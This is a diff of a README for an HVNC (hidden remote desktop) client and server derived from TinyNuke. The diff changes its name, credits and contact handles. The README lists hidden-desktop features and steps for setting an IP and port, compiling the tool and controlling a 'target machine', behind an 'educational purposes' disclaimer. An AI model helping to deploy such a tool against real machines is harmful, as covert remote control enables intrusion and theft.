@@ -1,9 +1,9 @@
-# HVNC - Tinynuke (Fixed)
+# HVNC - Meltedd (Fixed)
 This HVNC (Hidden Virtual Network Computing) Client and Server is based off of Tinynuke's HVNC (C++).
 
 I do **NOT** encourage malicious use of this code. This was made for educational purposes only.
 
-Credits: https://github.com/rossja/TinyNuke
+Credits: https://github.com/Meltedd/HVNC
 
 # Features:
 - Start Explorer (Hidden Desktop)
@@ -16,7 +16,7 @@ Credits: https://github.com/rossja/TinyNuke
 - Start Internet Explorer
 
 # Usage:
-- In the Client's "Main.cpp" file, edit the ip and port variables.
+- Open Client.sln Go Main Cpp Edit Ip and Port
 - Compile the Server & Client, and run the Server. 
 - Enter the port to listen on in the Server's console when prompted.
 - When the Client is executed, it will open a new "Hidden Desktop" window. If you right-click on the white bar at the top of the "Hidden Desktop" window, you can view the available commands that you can run on the target machine.
@@ -37,8 +37,4 @@ View Demo Video: https://vimeo.com/597459719
 ![Image1](https://i.ibb.co/JxMn3j4/image.png)
 
 # Contact Me:
-Discord: [Melted#0001](https://discord.com/users/820078435165798431)
-
-Telegram: [Melteddd](https://t.me/Melteddd)
-
-XMPP: melted@xmpp.jp
+Discord: [RepoGit#8264](https://discord.com/users/820078435165798431)
